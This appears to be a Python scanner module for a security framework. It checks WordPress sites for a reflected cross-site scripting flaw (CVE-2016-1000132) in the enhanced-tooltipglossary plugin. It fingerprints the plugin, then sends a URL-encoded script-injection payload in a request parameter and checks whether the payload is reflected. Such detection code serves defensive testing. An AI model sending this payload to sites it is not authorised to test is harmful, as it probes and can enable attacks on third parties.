#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress enhanced-tooltipglossary 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress enhanced-tooltipglossary 3.2.8 - Cross-Site Scripting Detection',
        'description': 'WordPress enhanced-tooltipglossary 3.2.8 contains a reflected cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2016', 'cve', 'wordpress', 'xss', 'wp-plugin', 'cminds', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'http://www.vapidlabs.com/wp/wp_advisory.php?v=37',
            'https://wordpress.org/plugins/enhanced-tooltipglossary',
            'https://nvd.nist.gov/vuln/detail/CVE-2016-1000132',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2016-1000132',
    }

    def run(self):
        path = '/wp-content/plugins/enhanced-tooltipglossary/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('CM Tooltip Glossary',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/wp-content/plugins/enhanced-tooltipglossary/backend/views/admin_importexport.php?itemsnumber=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&msg=imported'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('</script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress enhanced-tooltipglossary 3.2.8 - Cross-Site Scripting detected', path=path)
            return True
        return False

